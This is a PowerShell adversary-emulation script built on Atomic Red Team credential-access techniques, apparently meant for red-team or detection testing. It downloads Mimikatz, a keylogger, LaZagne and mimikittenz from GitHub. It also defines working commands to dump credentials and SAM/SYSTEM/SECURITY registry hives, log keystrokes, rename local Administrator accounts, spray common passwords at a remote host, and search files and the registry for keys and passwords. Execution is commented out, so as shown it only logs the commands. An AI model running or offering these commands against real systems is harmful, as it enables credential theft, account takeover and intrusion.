<# 

The commands in this script include atomic red team TTPs. This script is meant to automate execution of TTPs as well as make it reproducible 
along with generating a log file that notes down the time at which it was executed.parameters can be replaced with appropriate binaries suitable for yor
environment 

#>

$currentdir = $(pwd).Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$CREDACCESSLOGO=
'
############################################################################################################################################################################################################### 
#                                                                                                                                                                                                              #   
#                                                                                         CREDENTIAL ACCESS                                                                                                    #   
#                                                                                                                                                                                                              #
################################################################################################################################################################################################################
' 

Write-Host $CREDACCESSLOGO

<# 

$T1003_gsecdump_download = ""
$T1003_wce_download = ""

Invoke-WebRequest -Uri $T1003_gsecdump_download -OutFile $T1003_gsecdump
Invoke-WebRequest -Uri $T1003_wce_download -OutFile $T1003_wce

$T1003_gsecdump = 'gsecdump -a'
$T1003_wce = 'wce -o T1003-wce.txt'


#>

$T1003_mimikatz = "$currentdir\T1003.ps1"
$T1056_keystrokes = "$currentdir\T1056.ps1"
$T1003_gsecdump = "$currentdir\gsecdump.exe"
$T1003_wce      = "$currentdir\wce.exe"
$T1081_lazagne  = "$currentdir\laZagne.py"
$T1081_mimikittenz = "$currentdir\T1081.ps1"
$T1110_remote_host = "10.10.10.10"
$T1110_domain = "XYZ"



$T1003_mimikatz_download = "https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
$T1056_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1"
$T1081_lazagne_download = "https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Windows/laZagne.py"
$T1081_mimikittenz_download = "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1"

 
Invoke-WebRequest -Uri $T1003_mimikatz_download    -OutFile $T1003_mimikatz 
Invoke-WebRequest -Uri $T1056_download             -OutFile $T1056_keystrokes
Invoke-WebRequest -Uri $T1081_lazagne_download     -OutFile $T1081_lazagne
Invoke-WebRequest -Uri $T1081_mimikittenz_download -OutFile $T1081_mimikittenz


$T1003_mimikatz = 'Import-Module ' + $T1003_mimikatz + ' ; Invoke-Mimikatz -DumpCreds'
$T1003_reg = 'reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
'


$T1056 = ' .\T1056.ps1 -LogPath T1056.txt'
$T1081_lazagne = 'python2 laZagne.py all'
$T1081_mimikittenz = 'Import-Module ' + $T1081_mimikittenz + ' ; invoke-mimikittenz'

$T1098 = '
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w
		$hostname = (Get-CIMInstance CIM_ComputerSystem).Name
		$fmm = Get-CimInstance -ClassName win32_group -Filter "name = ''Administrators''" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name
		foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }

'

$T1110_remote_host = "10.10.10.10"
$T1110_domain = "XYZ"

$T1110 = '
net user /domain > users.txt
echo "Password1" >> pass.txt
echo "1q2w3e4r" >> pass.txt
echo "Password!" >> pass.txt
cmd.exe /c "@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use '+ $T1110_remote_host +' /user:'+ $T1110_domain +'\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete '+ $T1110_remote_host +' > NUL"
'

$T1145 = 'cmd.exe /c "dir c:\ /b /s .key | findstr /e .key"'

$T1214 = '
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
'


[array]$credential_TTP_number = "T1003_mimikatz","T1003_reg","T1056","T1081_lazagne","T1081_mimikittenz","T1098","T1110","T1145","T1214"
[array]$credential_access = $T1003_mimikatz, $T1003_reg, $T1056, $T1081_lazagne, $T1081_mimikittenz, $T1098,  $T1110, $T1145, $T1214 


for ($i=0; $i -lt $credential_access.length; $i++){

    Write-Host Exeucting $credential_TTP_number[$i] -ForegroundColor Red `n
    Write-Host $credential_access[$i] -ForegroundColor green `n
    Write-Host Time : $(Get-Date) -ForegroundColor Cyan `n
    Write-Host -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Get-Date | Add-Content log-credential-access.txt 
    "                         " | Add-Content log-credential-access.txt
    $credential_TTP_number[$i]+ " : " + $credential_access[$i] | Add-Content log-credential-access.txt
    "                         " | Add-Content log-credential-access.txt
    <# Invoke-Expression $credential_access[$i] #>
    "---------------------------------------------------------------------------------------------------------------------------" | Add-Content log-credential-access.txt 
} 
